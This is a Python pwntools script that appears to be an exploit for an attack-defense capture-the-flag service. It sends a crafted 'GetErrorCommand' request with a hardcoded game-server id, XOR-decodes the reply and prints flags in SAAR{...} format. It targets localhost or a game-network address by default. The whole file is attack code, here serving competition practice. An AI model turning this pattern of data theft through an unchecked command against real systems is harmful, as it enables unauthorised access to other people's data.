import json

from pwn import *
from utils import connectAndHandshake, getRSAKey

ip = '127.0.0.1'


def print_flags(content):
    FLAG_LENGTH = 24
    FLAG_REGEX = re.compile(r'SAAR{[A-Za-z0-9-_]{' + str(FLAG_LENGTH // 3 * 4) + '}}')
    for flag in FLAG_REGEX.findall(content):
        print(flag)


def exploit(ip, gameserver_id):
    key = getRSAKey()
    c, our_id, server_type = connectAndHandshake(ip, key)
    get_command = dict()
    get_command["asked_id"] = gameserver_id
    get_command["type"] = "GetErrorCommand"
    c.send(json.dumps(get_command))
    resp = c.recvuntil("}")

    resp = json.loads(resp)
    assert resp["type"] == "GetEvent"
    key, content = resp["message"].split("-")
    assert len(key) == len(content)
    content = base64.b64decode(content)
    key = base64.b64decode(key)
    content_decoded = bytes([k ^ c for k, c in zip(key, content)])
    content_decoded = content_decoded.decode()
    print_flags(content_decoded)


if __name__ == '__main__':
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = '10.32.1.2'

    gameserver_id = "43cfb2698bb8e236d06fe40394e910994ea00e5a61a01d087ef5b7c1443f27ef"
    exploit(target, gameserver_id)
